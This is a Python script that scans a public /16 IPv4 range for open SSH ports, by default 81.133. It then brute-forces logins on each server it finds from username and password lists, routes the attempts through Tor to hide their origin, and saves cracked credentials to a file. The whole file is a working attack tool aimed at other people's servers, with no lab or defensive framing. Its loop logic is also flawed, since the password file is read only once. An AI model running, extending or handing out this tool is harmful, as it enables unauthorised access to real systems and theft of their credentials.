#!/usr/bin/env python3

# IMPORTS
import socks  # Package actually PySocks - see requirements.txt
import socket
import time
import paramiko
from datetime import datetime


# FUNCTIONS
def build_ip_list(ip_block):  # Builds list of IPs to cover whole range.
    build_list = []
    for x in range(1, 256):
        for y in range(1, 255):
            build_list.append(ip_block+"."+str(x)+"."+str(y))
    return build_list


def is_ip_ssh(ip_to_check, timeout):  # Checks if an SSH server is running on current IP address
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        has_ssh = True
        s.settimeout(timeout)  # Set timeout for connection attempt
        try:
            s.connect((str(ip_to_check), 22))  # Convert IP address to string - should be already but double check
        except socket.error:
            has_ssh = False  # SSH server not found
        return has_ssh


def print_title(title):  # Formats a section title for consistency
    print()
    print(f"++++ {title} ++++")
    return


# MAIN RUNTIME
if __name__ == "__main__":
    '''
    SSH DISCOVERING AND BRUTE FORCING SCRIPT
    After first requesting an IP range in format xxx.xxx we build a scan list of IPs
    in the full IP format xxx.xxx.xxx.xxx
    
    Using just plain net we try to discover open SSH servers. Each live server is added to 
    a list so that we can try to bruteforce each one. This is quicker than trying to 
    bruteforce each possible IP as many will not have SSH running. At the end of the scanning 
    function, we save the found IPs to a file "servers.txt" for future reference if needed.

    Now we have a list of live SSH server IPs so we then loop through 3 nested loops
    built from reading the contents of 2 files. This is better than building internal lists 
    within the script as in only reads in each username and username on each brute force attempt
    rather than fill loads of memory with an large internal list of each.  This allows for much 
    more username and passwords without consuming large amounts of memory slowing things down.
    
    Using the list of live SSH IPs, together with the files for usernames and passwords
    we create 3 nested loops as follows:
    LOOP 1: As the smallest of all loops, this is made from the contents of usernames.txt
        LOOP 2: As the potentially largest file, we cycle through all the passwords
            LOOP 3: To prevent hitting the same IP repeatedly in quick succession, we finally loop 
            though our discovered live SSH servers.  This means that a single IP is not tested
            continuously and adds a pause between each attempt as other IPs are tested.
            Within this loop we try to connect using the current username and password. If we connect
            a message is output to screen and the IP, username and password are saved to the 
            file found.txt for future reference.
    '''
    print_title("SSH SCANNER AND BRUTE FORCE BOT")
    print("SSH service scan uses plain internet for speed.")
    print("Bruteforce attack uses TOR network for anonymity.")
    print("NOTE: TOR service needs to be running before continuing.")
    # Get beginning of IP range from user
    print_title("USER INPUT NEEDED")
    print("Press return on following options to accept default settings.")
    ip_range_to_scan = input("Range (Default = 81.133)? ...")
    if ip_range_to_scan == "":
        # Sets a default to speed up building and testing.
        ip_range_to_scan = "81.133"
    time_out_setting = input("SSH scan timeout in seconds? (Default = 1)")
    if time_out_setting == "":
        time_out_setting = 1
        print(f"Defaulted to {time_out_setting}")
    else:
        time_out_setting = int(time_out_setting)
    tor_time_out_setting = input("TOR connection timeout in seconds? (Default = 5)")
    if tor_time_out_setting == "":
        tor_time_out_setting = 5
        print(f"Defaulted to {tor_time_out_setting}")
    else:
        tor_time_out_setting = int(tor_time_out_setting)
    ips = build_ip_list(ip_range_to_scan)
    print(f"IP list created covering all IPs from {ips[1]} to {ips[-1]}")
    print_title("SCANNING FOR LIVE SSH SERVERS")
    print("Scanning for SSH servers...please wait. This may take some time!")
    print("I will keep you updated on progress.")
    live_ips = []
    count = 0
    for ip in ips:
        count += 1
        if count == 50:
            count = 0
            now = datetime.now()
            current_time = now.strftime("%H:%M:%S")
            print(f"\rTime:{current_time}\tServers:{len(live_ips)}\tProgress:{ip}", end="", flush=True)
        if is_ip_ssh(ip, time_out_setting):
            live_ips.append(ip)
            # print(f" + Found live SSH server at {ip}")
        else:
            # Uncomment following line for bug finding
            # print(f"No SSH response found")
            pass
    print("Saving all discovered servers to servers.txt for future reference.")
    timestamp = datetime.now()
    with open("servers.txt", "a") as file:
        file.write(f"SSH SERVERS FOUND ON {timestamp.strftime("%Y-%m-%d %H:%M:%S")}\n")
        for ip in live_ips:
            file.write(f"{ip} \n")
        file.write(f"\n")
    del ips  # Delete ips list to save memory as no longer needed
    print_title("STARTING BRUTE FORCE ATTACK")
    if len(live_ips) < 10:
        # If list of IPs is small, add a pause to prevent too many attempts to a small pool of IPs
        pause = True
        print("As there are less than 10 IPs to brute force, I will pause between each attempt.")
    else:
        print("As there more than 10 IPs to brute force, I will NOT pause between each attempt.")
        pause = False
    # Open files containing usernames and passwords.
    print("Opening password file.")
    password_file = open('passwords.txt', 'r')
    print("Opening username file.")
    username_file = open('usernames.txt', 'r')
    # Iterate over usernames
    for user in username_file:  # Iterate over usernames - outer loop
        user = user.strip()
        password: str
        for password in password_file:  # Iterate over passwords - middle loop
            password = password.strip()
            for ip in live_ips:  # Iterate over IPs - inner loop
                print(f"Trying {user} : {password} against {ip}")
                # Configure Tor proxy settings
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)  # Assumes Tor running
                socket.socket = socks.socksocket
                # Create SSH client
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                # Connect to the server through Tor
                try:
                    client.connect(
                        hostname=str(ip),
                        username=user,
                        password=password,
                        port=22,
                        timeout=tor_time_out_setting,  # Set timeout for connection attempt
                    )
                    print("------------------------------------------------------")
                    print("Connected to server through Tor!")
                    print(f"IP: {ip} with user: {user} and password: {password}")
                    print("------------------------------------------------------")
                    print("")
                    with open("found.txt", "a") as file:
                        file.write(f"------------------------------------------------------\n")
                        file.write(f"IP: {ip} with user: {user} and password: {password}\n")
                except (paramiko.AuthenticationException, socket.error) as e:
                    # print(f"Failed to connect to {ip}: {e}")  # Handle both authentication and connection failures
                    pass
                except Exception as e:
                    print(f"An error occurred: {e}")
                finally:
                    # Execute commands on the server (example)
                    # stdin, stdout, stderr = client.exec_command("ls -la")
                    # print(stdout.read().decode())
                    # Close the connection
                    client.close()
                    socks.setdefaultproxy()  # Reset Tor proxy configuration
                    if pause:
                        # If list of IPs is small, add a pause to prevent too many attempts to a small pool
                        time.sleep(5)
